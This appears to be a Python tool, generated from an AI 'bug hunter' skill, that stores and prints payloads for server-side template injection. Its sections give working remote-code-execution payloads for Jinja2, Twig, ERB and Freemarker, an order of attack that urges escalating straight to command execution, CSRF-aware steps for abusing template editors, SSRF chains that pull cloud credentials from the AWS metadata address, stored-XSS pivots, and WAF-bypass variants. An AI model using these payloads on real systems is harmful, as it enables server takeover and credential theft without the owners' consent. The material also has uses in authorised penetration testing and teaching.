#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-ssti

Skill: Cybermes Skill
Desc : Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render.

Run:  python claude-bughunter-hunt-ssti.py --help
      python claude-bughunter-hunt-ssti.py --list
      python claude-bughunter-hunt-ssti.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-ssti'
TITLE = 'Cybermes Skill'
DESCRIPTION = 'Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render.'

PAYLOADS = {
    'main': ["name: hunt-ssti", "description: \"Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render.\""],
    'autonomous-testing-priority': ["**Escalate straight to RCE \u2014 don't stop at arithmetic detection.**", "Arithmetic probes (`{{7*7}}\u219249`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value=\"{{7*7}}\">`), producing a false negative even when injection exists.", "**Order of attack:**", "1. **Try Jinja2 RCE first** (covers Python/Flask \u2014 the most common stack in modern web apps):", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "2. **If the endpoint is a traditional web form**, send as form-encoded body \u2014 NOT JSON:", "Content-Type: application/x-www-form-urlencoded", "field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).", "3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}`", "4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.", "**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts \u2014 the format is irrelevant, the content is the evidence."],
    '14-ssti-server-side-template-injection': [],
    'detection-payloads-try-all': ["{{7*7}}          \u2192 49 = Jinja2 / Twig", "${7*7}           \u2192 49 = Freemarker / Velocity / Mako (all use ${...})", "<%= 7*7 %>       \u2192 49 = ERB (Ruby)", "*{7*7}           \u2192 49 = Spring Thymeleaf", "{{7*'7'}}        \u2192 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig."],
    'rce-payloads': ["**Jinja2 (Python/Flask):**", "```python", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "**Twig (PHP/Symfony):**", "```php", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "**ERB (Ruby):**", "```ruby", "<%= `id` %>"],
    'where-to-test': ["Name/bio/description fields, email templates, invoice name, PDF generators,", "URL path parameters, search queries reflected in results, HTTP headers reflected"],
    'cms-documentation-template-editor-forms-authenticated': ["Some SSTI lives behind a logged-in template editor (CMS \"edit template\" / product-template / email-template", "preview). PortSwigger's *\"SSTI using documentation\"* class is this shape. Three things break a naive attempt:", "1. **Fingerprint BEFORE firing RCE \u2014 the engine decides the syntax.** Do NOT assume Jinja2. Probe the", "whole matrix and read which one evaluates:", "${7*7}  \u2192 49  AND  #{7*7} \u2192 49   \u21d2 Freemarker (Java)   \u2190 {{7*7}} does NOTHING here", "{{7*7}} \u2192 49                      \u21d2 Jinja2 / Twig", "<%= 7*7 %> \u2192 49                   \u21d2 ERB (Ruby)", "*{7*7}  \u2192 49                      \u21d2 Thymeleaf (Spring)", "If `{{7*7}}` renders literally but `${7*7}`\u219249, you are on **Freemarker** \u2014 stop sending `{{config...}}`.", "2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to", "`POST /\u2026/template?productId=N` with the id in the URL. The BODY carries only", "`csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns", "`400 \"Missing product id\"`. So keep the id in the query string (`?productId=N`) AND send a", "form-encoded body of `csrf=\u2026&template=<PAYLOAD>&template-action=preview`.", "3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*", "`csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback", "loop). Switch to `template-action=save` only once the payload is right, then trigger the render", "(load the public page that uses the template) to fire the command.", "**Freemarker documentation RCE** (the documented `Execute` utility \u2014 this IS the intended technique):", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }", "Velocity equivalent: `#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\")...`."],
    'related-skills-chains': ["- **`hunt-rce`** \u2014 SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}` \u2192 unauthenticated RCE as the rendering worker. Always escalate fingerprint \u2192 class-walker \u2192 cmd exec.", "- **`hunt-xss`** \u2014 When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes \u2192 inject `<script>` into rendered email template \u2192 stored XSS hitting every recipient who views the message.", "- **`hunt-ssrf`** \u2014 Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters \u2192 AWS metadata exfil \u2192 cloud creds.", "- **`hunt-file-upload`** \u2014 Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec(\"id\")}` to a Velocity/Freemarker-driven mail-merge \u2192 RCE.", "- **`security-arsenal`** \u2014 Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).", "- **`triage-validation`** \u2014 Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} \u2192 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()